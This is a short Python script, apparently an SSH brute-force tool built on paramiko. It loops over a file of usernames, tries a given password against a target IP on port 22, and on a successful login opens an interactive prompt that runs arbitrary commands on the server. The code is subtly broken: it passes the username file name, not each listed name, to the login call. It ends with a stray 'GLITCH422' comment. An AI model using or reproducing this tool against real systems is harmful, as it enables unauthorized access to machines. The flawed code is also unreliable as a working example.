import paramiko

username = input('Please insert the user name list:\t')
password = input('Please insert the password:\t')
ip = input("Please insert the IP address to communication:\t")
port = 22
with open(username, 'r') as user_list:
    for u in user_list:
        u = ''.join(u.split("\n"))
        try:
            ssh_session = paramiko.SSHClient()
            ssh_session.set_missing_host_key_policy(paramiko.AutoAddPolicy)
            ssh_session.connect(ip, port, username, password)
            print(f'Login success!\nUsername: {username} , Password: {password}')
            while True:
                command = input('Insert a command to execute on the server:\t')
                stdin, stdout, stderr = ssh_session.exec_command(command)
                print(stdout.read().decode())
                print(stderr.read().decode())
                end = input('Do you want to finish y/n?\t').lower()[0]
                if end == 'y':
                    break
        except Exception as e:
            print(e)
            
      # GLITCH422
